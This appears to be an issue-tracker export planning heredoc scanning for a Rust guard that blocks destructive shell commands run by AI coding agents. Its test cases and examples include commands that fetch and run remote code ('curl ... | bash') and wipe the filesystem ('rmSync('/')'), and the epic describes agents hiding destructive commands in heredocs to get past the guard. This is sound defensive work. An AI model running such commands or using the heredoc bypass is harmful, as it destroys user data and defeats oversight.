assert!(might_contain_heredoc(\"node -p 'process.version'\"));\n        \n        // Ruby\n        assert!(might_contain_heredoc(\"ruby -e 'puts 1'\"));\n        \n        // Perl\n        assert!(might_contain_heredoc(\"perl -e 'print 1'\"));\n        assert!(might_contain_heredoc(\"perl -E 'say 1'\"));\n        \n        // Shell\n        assert!(might_contain_heredoc(\"bash -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"sh -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"zsh -c 'echo hi'\"));\n    }\n    \n    #[test]\n    fn test_pipe_to_interpreter() {\n        assert!(might_contain_heredoc(\"curl http://x.com | bash\"));\n        assert!(might_contain_heredoc(\"cat script.py | python3\"));\n        assert!(might_contain_heredoc(\"echo code | node\"));\n    }\n    \n    #[test]\n    fn test_negative_cases() {\n        assert!(!might_contain_heredoc(\"git status\"));\n        assert!(!might_contain_heredoc(\"cargo build\"));\n        assert!(!might_contain_heredoc(\"ls -la\"));\n        assert!(!might_contain_heredoc(\"cat file.txt\"));\n        assert!(!might_contain_heredoc(\"grep pattern file\"));\n    }\n}\n```\n\n### 2. Heredoc Extraction Tests (`tests/extraction.rs`)\n\n```rust\nmod extraction_tests {\n    #[test]\n    fn test_extract_simple_heredoc() {\n        let cmd = \"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"print('hello')\\n\");\n        assert_eq!(heredoc.delimiter, \"EOF\");\n        assert!(heredoc.quoted);\n    }\n    \n    #[test]\n    fn test_extract_indented_heredoc() {\n        let cmd = \"bash \u003c\u003c- 'END'\\n\\techo hello\\n\\techo world\\n\\tEND\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        // \u003c\u003c- strips leading tabs\n        assert_eq!(heredoc.content, \"echo hello\\necho world\\n\");\n    }\n    \n    #[test]\n    fn test_extract_inline_script() {\n        let cmd = \"python3 -c 'import os; os.system(\\\"ls\\\")'\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"import os; os.system(\\\"ls\\\")\");\n    }\n}\n```\n\n### 3. Language Detection Tests (`tests/language_detection.rs`)\n\n```rust\nmod language_detection_tests {\n    #[test]\n    fn test_detect_from_command() {\n        assert_eq!(detect_language_from_cmd(\"python3 -c\"), Language::Python);\n        assert_eq!(detect_language_from_cmd(\"node -e\"), Language::JavaScript);\n        assert_eq!(detect_language_from_cmd(\"ruby -e\"), Language::Ruby);\n        assert_eq!(detect_language_from_cmd(\"perl -e\"), Language::Perl);\n        assert_eq!(detect_language_from_cmd(\"bash -c\"), Language::Bash);\n    }\n    \n    #[test]\n    fn test_detect_from_shebang() {\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/env python3\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"#!/bin/bash\\n\"), Language::Bash);\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/node\\n\"), Language::JavaScript);\n    }\n    \n    #[test]\n    fn test_detect_from_content_heuristics() {\n        assert_eq!(detect_language_from_content(\"import os\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"require('fs')\\n\"), Language::JavaScript);\n        assert_eq!(detect_language_from_content(\"use strict;\\n\"), Language::Perl);\n    }\n}\n```\n\n### 4. Pattern Matching Tests (`tests/patterns.rs`)\n\nOne submodule per language with comprehensive tests.\n\n### 5. False Positive Tests (`tests/false_positives.rs`)\n\n```rust\nmod false_positive_tests {\n    #[test]\n    fn test_documentation_allowed() {\n        // These should NOT be blocked\n        assert!(check_command(\"bd create --description='blocks rm -rf'\").is_allowed());\n        assert!(check_command(\"git commit -m 'fix rm -rf detection'\").is_allowed());\n        assert!(check_command(\"grep 'rm -rf' src/\").is_allowed());\n    }\n}\n```\n\n## Coverage Requirements\n\n- Line coverage: \u003e 90%\n- Branch coverage: \u003e 85%\n- All public functions have tests\n- All error paths tested","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.163885724-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T19:28:33.346249627-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:28:33.507729581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:28:33.663971771-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-y4j","title":"Implement heredoc content extraction","description":"# Implement Heredoc Content Extraction\n\n## Objective\nExtract the actual script content from detected heredocs for scanning.\n\n## Background\nOnce we detect a heredoc is present, we need to accurately extract its content. This is more complex than detection because we must:\n1. Identify the delimiter\n2. Find the matching end delimiter\n3. Handle quoting and expansion rules\n4. Preserve or strip indentation as appropriate\n\n## Implementation Details\n\n### Heredoc Extraction Logic\n\n```rust\npub struct HeredocContent {\n    /// The extracted script content\n    pub content: String,\n    /// Detected or inferred language\n    pub language: Option\u003cLanguage\u003e,\n    /// Original delimiter used\n    pub delimiter: String,\n    /// Whether the delimiter was quoted (no expansion)\n    pub quoted: bool,\n    /// Byte offset in original command\n    pub start_offset: usize,\n    pub end_offset: usize,\n}\n\npub fn extract_heredoc(cmd: \u0026str) -\u003e Option\u003cHeredocContent\u003e {\n    // 1. Find heredoc start pattern\n    // 2. Extract delimiter (handle quoting)\n    // 3. Find matching end delimiter\n    // 4. Extract content between\n    // 5. Apply indentation rules for \u003c\u003c-\n}\n```\n\n### Delimiter Handling\n- Unquoted: EOF, END, SCRIPT\n- Single-quoted: 'EOF', 'END'\n- Double-quoted: \"EOF\", \"END\"\n- Backtick-quoted: \\`EOF\\` (rare)\n\n### Indentation Rules\n- Standard \u003c\u003c: preserve all indentation\n- Tab-stripped \u003c\u003c-: remove leading tabs from content AND delimiter\n- Zsh \u003c\u003c~: remove common leading whitespace\n\n### Edge Cases\n- Multiple heredocs in one command\n- Nested command substitution containing heredocs\n- Empty heredocs\n- Heredocs with embedded quotes\n- Heredocs that span multiple lines of piped commands\n\n### Inline Script Extraction (Non-Heredoc)\nAlso handle -c/-e style inline scripts:\n```\npython -c \"import os; os.system('...')\"\nnode -e \"require('fs').rmSync('/')\"\n```\n\n## Files to Modify\n- New: src/heredoc/extract.rs\n- src/heredoc/mod.rs\n\n## Testing\n- Test each delimiter quoting style\n- Test \u003c\u003c, \u003c\u003c-, \u003c\u003c~ variants\n- Test inline -c/-e scripts\n- Test edge cases (empty, nested, multiple)\n- Test error handling for malformed heredocs\n\n## Dependencies\n- Implement heredoc detection (git_safety_guard-49s)\n\n## Success Criteria\n- Correctly extract content from all supported heredoc forms\n- Handle edge cases gracefully (no panics)\n- Clear error messages for malformed input","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:21.081724798-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:31:21.081724798-05:00","dependencies":[{"issue_id":"git_safety_guard-y4j","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:27.231452201-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-yza","title":"Epic: ast-grep Integration for Heredoc Detection","description":"# Epic: ast-grep Integration for Heredoc Detection\n\n## Problem Statement\n\nAI coding agents sometimes attempt to bypass destructive command guards by embedding dangerous commands inside heredoc scripts. The current dcg implementation only examines the top-level command, missing destructive patterns hidden within inline scripts.\n\n### Example Attack Vectors\n\nAn attacker might use Python, Bash, Node.js, or other language heredocs to embed dangerous operations that slip past the quick-reject filter. The top-level command appears benign (e.g., \"python3 \u003c\u003c EOF\") while the heredoc body contains destructive operations.\n\n## Solution Overview\n\nIntegrate ast-grep (or tree-sitter directly) to:\n1. Detect heredoc patterns in commands\n2. Extract embedded script content\n3. Parse the script according to its detected language\n4. Check for destructive patterns within the parsed AST\n5. Block if dangerous patterns are found\n\n## Why ast-grep?\n\nast-grep uses tree-sitter for parsing, providing:\n- **Structural awareness**: Understands code structure, not just text patterns\n- **Language support**: Handles Python, Bash, JavaScript, TypeScript, Ruby, Perl, and many more\n- **Pattern matching**: Powerful AST pattern matching syntax\n- **Battle-tested**: Used in production for large-scale code search and refactoring\n\n## Key Technical Challenges\n\n1. **Heredoc Syntax Variants**: Many forms exist (\u003c\u003c, \u003c\u003c-, \u003c\u003c\u003c, \u003c\u003c~, quoted vs unquoted delimiters)\n2. **Language Detection**: Must infer language from command prefix, shebang, or heuristics\n3. **Performance**: Every command passes through dcg; parsing must be fast\n4. **Pattern Library**: Need comprehensive patterns per language for destructive operations\n5. **Obfuscation**: Attackers might use encoding, string concatenation, or indirect execution\n\n## Success Criteria\n\n- Detect and block heredoc-embedded destructive commands\n- Minimal latency impact (under 10ms for heredoc detection, under 50ms for full parsing)\n- Support Python, Bash, JavaScript/TypeScript, Ruby, Perl at minimum\n- Configurable via pack system (heredoc scanning can be enabled/disabled)\n- Comprehensive test coverage for bypass attempts\n\n## Architecture Decision\n\nWe will evaluate two integration approaches:\n1. **External binary**: Call ast-grep CLI and parse JSON output\n2. **Library integration**: Use tree-sitter Rust bindings directly\n\nThe decision will be made in the research phase based on:\n- Performance benchmarks\n- Dependency complexity\n- Maintenance burden\n- Pattern expressiveness\n\n## Out of Scope (for initial implementation)\n\n- Scanning files referenced in commands (e.g., \"bash script.sh\")\n- Deep obfuscation detection (base64, rot13, etc.)\n- Network-based command retrieval (\"curl ... | bash\" style)\n- Recursive heredoc nesting","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T18:28:08.502051689-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:28:08.502051689-05:00","dependencies":[{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:28:33.156627112-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:28:51.942182529-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:29:24.645603891-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:29:45.137126036-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:14.545375401-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:30:37.534882086-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:06.013753048-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:27.250568872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:31:58.344341425-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:32:32.951489053-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:34:20.619502644-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:35:11.238168575-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:35:40.032362893-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:37:03.035457423-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:37:34.31174363-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:37:35.469733942-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:37:37.404070403-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.216578116-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:39:24.548074304-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:16.23083852-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-4o8","type":"blocks","created_at":"2026-01-07T18:40:53.391076545-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.383677396-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.824701001-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-fpim","type":"blocks","created_at":"2026-01-07T19:28:33.995705031-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-hcfg","type":"blocks","created_at":"2026-01-07T19:28:34.164491315-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-perf","type":"blocks","created_at":"2026-01-07T19:28:34.326399906-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-e2eh","type":"blocks","created_at":"2026-01-07T19:28:34.496866284-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-tlog","type":"blocks","created_at":"2026-01-07T19:28:34.658765407-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-unit","type":"blocks","created_at":"2026-01-07T19:28:34.843179581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-erux","type":"blocks","created_at":"2026-01-07T19:31:01.81722121-05:00","created_by":"ubuntu"}]}
